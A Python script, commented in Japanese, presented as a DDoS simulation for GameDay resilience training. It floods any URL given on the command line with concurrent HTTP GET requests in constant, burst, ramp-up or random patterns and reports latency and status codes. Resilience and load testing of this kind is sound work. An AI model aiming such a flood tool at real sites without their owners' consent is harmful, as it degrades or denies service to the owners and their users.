#!/usr/bin/env python3
"""
高度なDDoS攻撃シミュレーションスクリプト
GameDay環境での学習目的のみに使用
"""

import asyncio
import aiohttp
import argparse
import json
import logging
import random
import time
from datetime import datetime
from typing import List, Dict, Any
import sys
import os

# ログ設定
def setup_logging(log_level: str = "INFO") -> logging.Logger:
    """ログ設定を初期化"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{log_dir}/advanced_ddos_{timestamp}.log"
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"ログファイル: {log_file}")
    return logger

class AttackPattern:
    """攻撃パターンの定義"""
    
    @staticmethod
    def constant_rate(duration: int, rate: int) -> List[float]:
        """一定レートの攻撃パターン"""
        interval = 1.0 / rate if rate > 0 else 1.0
        return [interval] * int(duration * rate)
    
    @staticmethod
    def burst_pattern(duration: int, burst_size: int, burst_interval: int) -> List[float]:
        """バースト攻撃パターン"""
        pattern = []
        current_time = 0
        
        while current_time < duration:
            # バースト期間中は高頻度
            for _ in range(burst_size):
                pattern.append(0.01)  # 10ms間隔
                current_time += 0.01
                if current_time >= duration:
                    break
            
            # 休止期間
            if current_time < duration:
                pattern.append(burst_interval)
                current_time += burst_interval
        
        return pattern
    
    @staticmethod
    def ramp_up_pattern(duration: int, max_rate: int) -> List[float]:
        """徐々に増加する攻撃パターン"""
        pattern = []
        steps = 100
        step_duration = duration / steps
        
        for i in range(steps):
            current_rate = (i + 1) * max_rate / steps
            interval = 1.0 / current_rate if current_rate > 0 else 1.0
            requests_in_step = int(step_duration * current_rate)
            
            for _ in range(requests_in_step):
                pattern.append(interval)
        
        return pattern
    
    @staticmethod
    def random_pattern(duration: int, min_rate: int, max_rate: int) -> List[float]:
        """ランダムな攻撃パターン"""
        pattern = []
        current_time = 0
        
        while current_time < duration:
            rate = random.randint(min_rate, max_rate)
            interval = 1.0 / rate if rate > 0 else 1.0
            pattern.append(interval)
            current_time += interval
        
        return pattern

class DDoSSimulator:
    """DDoS攻撃シミュレーター"""
    
    def __init__(self, target_url: str, logger: logging.Logger):
        self.target_url = target_url
        self.logger = logger
        self.session = None
        self.results = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'status_codes': {},
            'start_time': None,
            'end_time': None
        }
    
    async def __aenter__(self):
        """非同期コンテキストマネージャーの開始"""
        connector = aiohttp.TCPConnector(
            limit=1000,  # 最大接続数
            limit_per_host=100,  # ホスト毎の最大接続数
            ttl_dns_cache=300,  # DNS キャッシュTTL
            use_dns_cache=True
        )
        
        timeout = aiohttp.ClientTimeout(
            total=30,  # 総タイムアウト
            connect=10,  # 接続タイムアウト
            sock_read=10  # 読み取りタイムアウト
        )
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'GameDay-DDoS-Simulator/1.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """非同期コンテキストマネージャーの終了"""
        if self.session:
            await self.session.close()
    
    async def single_request(self, request_id: int) -> Dict[str, Any]:
        """単一リクエストの実行"""
        start_time = time.time()
        
        try:
            async with self.session.get(self.target_url) as response:
                await response.read()  # レスポンスボディを読み取り
                
                end_time = time.time()
                response_time = end_time - start_time
                
                return {
                    'request_id': request_id,
                    'status_code': response.status,
                    'response_time': response_time,
                    'success': True,
                    'error': None
                }
        
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            return {
                'request_id': request_id,
                'status_code': 0,
                'response_time': response_time,
                'success': False,
                'error': str(e)
            }
    
    def update_results(self, result: Dict[str, Any]):
        """結果の更新"""
        self.results['total_requests'] += 1
        
        if result['success']:
            self.results['successful_requests'] += 1
            self.results['response_times'].append(result['response_time'])
            
            status_code = result['status_code']
            self.results['status_codes'][status_code] = \
                self.results['status_codes'].get(status_code, 0) + 1
        else:
            self.results['failed_requests'] += 1
            self.logger.debug(f"リクエスト失敗: {result['error']}")
    
    async def execute_pattern(self, pattern: List[float], max_concurrent: int = 100):
        """攻撃パターンの実行"""
        self.logger.info(f"攻撃パターン実行開始: {len(pattern)}リクエスト")
        self.results['start_time'] = datetime.now()
        
        semaphore = asyncio.Semaphore(max_concurrent)
        tasks = []
        
        async def limited_request(request_id: int, delay: float):
            """同時実行数制限付きリクエスト"""
            await asyncio.sleep(delay)
            async with semaphore:
                result = await self.single_request(request_id)
                self.update_results(result)
                
                if request_id % 100 == 0:
                    self.logger.info(f"進捗: {request_id}/{len(pattern)} リクエスト完了")
        
        # タスクの作成
        current_delay = 0
        for i, interval in enumerate(pattern):
            current_delay += interval
            task = asyncio.create_task(limited_request(i, current_delay))
            tasks.append(task)
        
        # 全タスクの完了を待機
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.results['end_time'] = datetime.now()
        self.logger.info("攻撃パターン実行完了")
    
    def generate_report(self) -> Dict[str, Any]:
        """攻撃結果のレポート生成"""
        if not self.results['response_times']:
            avg_response_time = 0
            min_response_time = 0
            max_response_time = 0
        else:
            avg_response_time = sum(self.results['response_times']) / len(self.results['response_times'])
            min_response_time = min(self.results['response_times'])
            max_response_time = max(self.results['response_times'])
        
        duration = None
        if self.results['start_time'] and self.results['end_time']:
            duration = (self.results['end_time'] - self.results['start_time']).total_seconds()
        
        report = {
            'target_url': self.target_url,
            'attack_summary': {
                'total_requests': self.results['total_requests'],
                'successful_requests': self.results['successful_requests'],
                'failed_requests': self.results['failed_requests'],
                'success_rate': (self.results['successful_requests'] / self.results['total_requests'] * 100) 
                               if self.results['total_requests'] > 0 else 0,
                'duration_seconds': duration
            },
            'performance_metrics': {
                'average_response_time': avg_response_time,
                'min_response_time': min_response_time,
                'max_response_time': max_response_time,
                'requests_per_second': (self.results['total_requests'] / duration) 
                                     if duration and duration > 0 else 0
            },
            'status_codes': self.results['status_codes'],
            'start_time': self.results['start_time'].isoformat() if self.results['start_time'] else None,
            'end_time': self.results['end_time'].isoformat() if self.results['end_time'] else None
        }
        
        return report

async def main():
    """メイン関数"""
    parser = argparse.ArgumentParser(description='高度なDDoS攻撃シミュレーション')
    parser.add_argument('-u', '--url', required=True, help='ターゲットURL')
    parser.add_argument('-p', '--pattern', choices=['constant', 'burst', 'ramp', 'random'], 
                       default='constant', help='攻撃パターン')
    parser.add_argument('-d', '--duration', type=int, default=60, help='攻撃持続時間（秒）')
    parser.add_argument('-r', '--rate', type=int, default=10, help='リクエストレート（秒あたり）')
    parser.add_argument('--max-rate', type=int, default=100, help='最大リクエストレート')
    parser.add_argument('--min-rate', type=int, default=1, help='最小リクエストレート')
    parser.add_argument('--burst-size', type=int, default=50, help='バーストサイズ')
    parser.add_argument('--burst-interval', type=int, default=5, help='バースト間隔（秒）')
    parser.add_argument('--max-concurrent', type=int, default=100, help='最大同時接続数')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='ログレベル')
    parser.add_argument('--output', help='結果出力ファイル（JSON形式）')
    
    args = parser.parse_args()
    
    # ログ設定
    logger = setup_logging(args.log_level)
    
    # 攻撃パターンの生成
    logger.info(f"攻撃パターン生成: {args.pattern}")
    
    if args.pattern == 'constant':
        pattern = AttackPattern.constant_rate(args.duration, args.rate)
    elif args.pattern == 'burst':
        pattern = AttackPattern.burst_pattern(args.duration, args.burst_size, args.burst_interval)
    elif args.pattern == 'ramp':
        pattern = AttackPattern.ramp_up_pattern(args.duration, args.max_rate)
    elif args.pattern == 'random':
        pattern = AttackPattern.random_pattern(args.duration, args.min_rate, args.max_rate)
    else:
        logger.error(f"未知の攻撃パターン: {args.pattern}")
        return 1
    
    logger.info(f"生成されたパターン: {len(pattern)}リクエスト")
    
    # 攻撃実行
    try:
        async with DDoSSimulator(args.url, logger) as simulator:
            await simulator.execute_pattern(pattern, args.max_concurrent)
            report = simulator.generate_report()
            
            # 結果表示
            logger.info("=== 攻撃結果サマリー ===")
            logger.info(f"総リクエスト数: {report['attack_summary']['total_requests']}")
            logger.info(f"成功リクエスト数: {report['attack_summary']['successful_requests']}")
            logger.info(f"失敗リクエスト数: {report['attack_summary']['failed_requests']}")
            logger.info(f"成功率: {report['attack_summary']['success_rate']:.2f}%")
            logger.info(f"平均応答時間: {report['performance_metrics']['average_response_time']:.3f}秒")
            logger.info(f"リクエスト/秒: {report['performance_metrics']['requests_per_second']:.2f}")
            
            # ステータスコード分布
            if report['status_codes']:
                logger.info("ステータスコード分布:")
                for code, count in sorted(report['status_codes'].items()):
                    logger.info(f"  {code}: {count}回")
            
            # 結果をファイルに保存
            if args.output:
                with open(args.output, 'w', encoding='utf-8') as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                logger.info(f"結果をファイルに保存: {args.output}")
    
    except Exception as e:
        logger.error(f"攻撃実行中にエラーが発生: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    try:
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n攻撃が中断されました")
        sys.exit(1)
    except Exception as e:
        print(f"予期しないエラー: {e}")
        sys.exit(1)